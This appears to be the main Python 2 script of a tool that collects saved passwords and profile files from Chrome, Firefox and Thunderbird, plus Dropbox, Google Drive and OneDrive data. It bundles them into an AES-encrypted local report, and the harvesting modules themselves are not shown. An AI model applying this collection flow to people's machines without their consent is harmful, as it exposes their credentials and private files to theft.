#!/usr/bin/python


####
### Main script
##
#
##
###
####

import cloud, browserfile, config, packetizer, crypto, logger
import os, subprocess, time, json

def main():
	#try:
		# create directory used for report files
		reportName = crypto.md5(str(time.time()))
		completeReportPath = os.path.join(config.START_PATH, reportName)
		os.mkdir(completeReportPath)

		# find passwords and browser files
		chromeReportFolder = os.path.join(completeReportPath, config.GCHROME_COPY_FOLDER)
		os.mkdir(chromeReportFolder)
		chrome = browserfile.chromeFinder(chromeReportFolder)

		ffReportFolder = os.path.join(completeReportPath, config.FF_COPY_FOLDER)
		os.mkdir(ffReportFolder)
		ffList = browserfile.firefoxFinder(ffReportFolder)

		thReportFolder = os.path.join(completeReportPath, config.TH_COPY_FOLDER)
		os.mkdir(thReportFolder)
		thList = browserfile.thunderbirdFinder(thReportFolder)

		browserPackList = list()
		browserPackList.append(chrome)
		browserPackList.append(ffList)
		browserPackList.append(thList)

		# find cloud files
		cloudPackList = list()
		dropboxList = cloud.dropbox()
		cloudPackList.append(dropboxList)

		if config.OP_SYS == "Windows":
			gdriveList = cloud.gdrive()
			onedriveList = cloud.onedrive()

			cloudPackList.append(gdriveList)
			cloudPackList.append(onedriveList)

		#pack all together
		jsontext = packetizer.mainPacker(browserPackList, cloudPackList)
		print jsontext
		crypt = crypto.makeReport(crypto.encryptAES(jsontext))

		# save into a file
		os.chdir(completeReportPath)
		fileName = reportName + ".report"
		f = open(fileName,"w+")
		f.write(json.dumps(crypt, sort_keys=True, indent=4))
		f.close()
		logger.log("Report file written to " + os.path.join(config.START_PATH,fileName))
	#except Exception as e:
		#logger.log(e)

if __name__ == "__main__":
	main()
